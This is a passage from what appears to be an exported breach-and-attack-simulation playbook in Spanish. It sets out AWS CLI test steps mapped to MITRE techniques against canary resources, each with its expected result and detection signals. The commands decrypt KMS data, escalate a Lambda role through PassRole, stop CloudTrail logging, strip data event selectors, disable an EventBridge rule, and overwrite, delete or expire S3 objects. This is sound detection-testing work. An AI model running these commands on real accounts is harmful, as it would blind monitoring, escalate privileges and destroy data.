AWS_PAGER="" aws kms decrypt --ciphertext-blob "fileb://${STRIKE_STATE_DIR}/kms-ciphertext.bin" --key-id "${STRIKE_BAS_KMS_KEY_ARN}" --query Plaintext --output text | base64 --decode > "${STRIKE_STATE_DIR}/kms-plaintext.bin"
sha256sum "${STRIKE_STATE_DIR}/kms-plaintext.bin" | tee "${STRIKE_STATE_DIR}/aws-kms-decrypt-canary.sha256"
```

**Resultado esperado:**

KMS devuelve plaintext no vacío.

**Señales de detección:**

CloudTrail Decrypt; key ARN, encryption context, principal y servicio llamante.

### 36. Escanear tabla DynamoDB canary

**MITRE:** T1213

Emula recolección masiva desde un repositorio de información cloud.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws dynamodb scan --table-name "${STRIKE_BAS_TABLE_NAME}" --select COUNT --output json | tee "${STRIKE_STATE_DIR}/aws-dynamodb-scan-canary-table.json"
```

**Resultado esperado:**

DynamoDB devuelve Count y ScannedCount mayores que cero.

**Señales de detección:**

CloudTrail DynamoDB Scan data event; tabla, principal, capacidad consumida y frecuencia.

### 37. Leer registro específico de DynamoDB

**MITRE:** T1213

Emula extracción dirigida desde una base NoSQL cloud.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws dynamodb get-item --table-name "${STRIKE_BAS_TABLE_NAME}" --key '{"record_id":{"S":"canary-001"}}' --projection-expression record_id --output json | tee "${STRIKE_STATE_DIR}/aws-dynamodb-get-canary-item.json"
```

**Resultado esperado:**

DynamoDB devuelve el objeto canary-001.

**Señales de detección:**

CloudTrail DynamoDB GetItem data event; key consultada, tabla y principal.

### 38. Recolectar eventos de CloudWatch Logs

**MITRE:** T1530

Emula acceso a registros almacenados en cloud.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws logs filter-log-events --log-group-name "${STRIKE_BAS_LAMBDA_LOG_GROUP}" --limit 50 --output json | tee "${STRIKE_STATE_DIR}/aws-logs-filter-lambda-events.json"
```

**Resultado esperado:**

CloudWatch Logs devuelve una respuesta válida, con cero o más eventos.

**Señales de detección:**

CloudTrail FilterLogEvents; acceso a logs de aplicaciones por una identidad no habitual.

### 39. Obtener configuración de Lambda

**MITRE:** T1526

Guarda la configuración original para una modificación posterior segura.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws lambda get-function-configuration --function-name "${STRIKE_BAS_LAMBDA_NAME}" --output json | tee "${STRIKE_STATE_DIR}/aws-lambda-get-function-configuration.json"
```

**Resultado esperado:**

GetFunctionConfiguration devuelve el role base esperado.

**Señales de detección:**

CloudTrail GetFunctionConfiguration sobre una función que maneja datos sensibles.

### 40. Cambiar execution role de Lambda mediante PassRole

**MITRE:** T1548.005

Emula abuso de iam:PassRole mediado por un servicio serverless.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
ORIGINAL=$(jq -r '.Role' "${STRIKE_STATE_DIR}/aws-lambda-get-function-configuration.json")
printf '%s' "$ORIGINAL" > "${STRIKE_STATE_DIR}/lambda-original-role.txt"
AWS_PAGER="" aws lambda update-function-configuration --function-name "${STRIKE_BAS_LAMBDA_NAME}" --role "${STRIKE_BAS_LAMBDA_ELEVATED_ROLE_ARN}" --output json > "${STRIKE_STATE_DIR}/aws-lambda-update-execution-role.json"
AWS_PAGER="" aws lambda wait function-updated --function-name "${STRIKE_BAS_LAMBDA_NAME}"
```

**Resultado esperado:**

La función queda Active y configurada con el role elevado.

**Señales de detección:**

CloudTrail UpdateFunctionConfiguration y PassRole; actor que cambia la función, role pasado y servicio destino.

### 41. Invocar Lambda con identidad de servicio elevada

**MITRE:** T1648

La función accede a recursos canary y devuelve únicamente hashes y estados.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws lambda invoke --function-name "${STRIKE_BAS_LAMBDA_NAME}" --payload '{}' --cli-binary-format raw-in-base64-out "${STRIKE_STATE_DIR}/lambda-response.json" --output json | tee "${STRIKE_STATE_DIR}/aws-lambda-invoke-elevated-function.json"
```

**Resultado esperado:**

StatusCode es 200 y el payload indica una ejecución controlada.

**Señales de detección:**

CloudTrail Invoke y eventos posteriores de S3, Secrets Manager, SSM o DynamoDB atribuidos al Lambda execution role.

### 42. Consultar estado del trail BAS

**MITRE:** T1526

Descubre si el control de logging está activo antes de intentar modificarlo.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws cloudtrail get-trail-status --name "${STRIKE_BAS_TRAIL_NAME}" --output json | tee "${STRIKE_STATE_DIR}/aws-cloudtrail-get-trail-status.json"
```

**Resultado esperado:**

IsLogging es true antes de la prueba.

**Señales de detección:**

CloudTrail GetTrailStatus por un principal no habitual.

### 43. Detener logging del trail BAS

**MITRE:** T1685.002

Emula evasión mediante deshabilitación de logging cloud.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws cloudtrail stop-logging --name "${STRIKE_BAS_TRAIL_NAME}"
```

**Resultado esperado:**

GetTrailStatus muestra IsLogging=false.

**Señales de detección:**

CloudTrail StopLogging detectado desde la cuenta de seguridad o una fuente independiente.

### 44. Eliminar temporalmente data event selectors

**MITRE:** T1685.002

Emula reducción selectiva de visibilidad del data plane.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws cloudtrail get-event-selectors --trail-name "${STRIKE_BAS_TRAIL_NAME}" --output json | jq '{EventSelectors:.EventSelectors}' > "${STRIKE_STATE_DIR}/cloudtrail-original-selectors.json"
cat > "${STRIKE_STATE_DIR}/cloudtrail-management-only.json" <<EOF
{"EventSelectors":[{"ReadWriteType":"All","IncludeManagementEvents":true,"DataResources":[]}]}
EOF
AWS_PAGER="" aws cloudtrail put-event-selectors --trail-name "${STRIKE_BAS_TRAIL_NAME}" --event-selectors "file://${STRIKE_STATE_DIR}/cloudtrail-management-only.json" > "${STRIKE_STATE_DIR}/aws-cloudtrail-remove-data-event-selectors.json"
```

**Resultado esperado:**

El trail conserva management events pero deja de declarar data resources temporalmente.

**Señales de detección:**

CloudTrail PutEventSelectors; reducción de cobertura sobre S3, Lambda o DynamoDB.

### 45. Deshabilitar regla EventBridge canary

**MITRE:** T1685.002

Emula manipulación de una integración defensiva cloud.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws events disable-rule --name "${STRIKE_BAS_EVENT_RULE_NAME}"
```

**Resultado esperado:**

DescribeRule devuelve State=DISABLED.

**Señales de detección:**

CloudTrail DisableRule y pérdida posterior de eventos en el target defensivo.

### 46. Sobrescribir objeto S3 canary

**MITRE:** T1485

Emula corrupción de datos sin afectar información real y conserva una copia local para rollback.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
umask 077
AWS_PAGER="" aws s3api get-object --bucket "${STRIKE_BAS_DATA_BUCKET}" --key "${STRIKE_BAS_IMPACT_KEY}" "${STRIKE_STATE_DIR}/impact-original.bin" >/dev/null
printf 'STRIKE-ATOMIC-OVERWRITE %s
' "$(date -u +%FT%TZ)" > "${STRIKE_STATE_DIR}/impact-overwrite.txt"
AWS_PAGER="" aws s3api put-object --bucket "${STRIKE_BAS_DATA_BUCKET}" --key "${STRIKE_BAS_IMPACT_KEY}" --body "${STRIKE_STATE_DIR}/impact-overwrite.txt" --output json > "${STRIKE_STATE_DIR}/aws-s3-overwrite-impact-canary.json"
```

**Resultado esperado:**

La versión actual del objeto contiene el marcador STRIKE-ATOMIC-OVERWRITE.

**Señales de detección:**

S3 PutObject data event sobre un objeto preexistente, cambio de ETag y nueva versión.

### 47. Crear delete marker sobre objeto versionado

**MITRE:** T1485

No elimina versiones históricas y el cleanup retira únicamente el marker creado.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws s3api delete-object --bucket "${STRIKE_BAS_DATA_BUCKET}" --key "${STRIKE_BAS_IMPACT_KEY}" --output json > "${STRIKE_STATE_DIR}/aws-s3-create-delete-marker.json"
```

**Resultado esperado:**

La respuesta indica DeleteMarker=true y devuelve VersionId.

**Señales de detección:**

S3 DeleteObject data event, delete marker y posible patrón de borrado masivo.

### 48. Acelerar lifecycle sobre prefijo canary

**MITRE:** T1485

Emula preparación de destrucción de datos mediante políticas nativas.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws s3api get-bucket-lifecycle-configuration --bucket "${STRIKE_BAS_DATA_BUCKET}" --output json | jq '{Rules:.Rules}' > "${STRIKE_STATE_DIR}/s3-original-lifecycle.json"
cat > "${STRIKE_STATE_DIR}/s3-impact-lifecycle.json" <<EOF
{"Rules":[{"ID":"STRIKEAtomicImpactLifecycle","Status":"Enabled","Filter":{"Prefix":"impact-canary/"},"Expiration":{"Days":1},"NoncurrentVersionExpiration":{"NoncurrentDays":1}}]}
EOF
AWS_PAGER="" aws s3api put-bucket-lifecycle-configuration --bucket "${STRIKE_BAS_DATA_BUCKET}" --lifecycle-configuration "file://${STRIKE_STATE_DIR}/s3-impact-lifecycle.json"
```

**Resultado esperado:**

GetBucketLifecycleConfiguration muestra la regla STRIKEAtomicImpactLifecycle.

**Señales de detección:**

CloudTrail PutBucketLifecycleConfiguration; expiración reducida sobre datos protegidos.

---
_Exportado desde STRIKE — `aws-atomic-identity-compromise-and-data-plane-intrusion`_
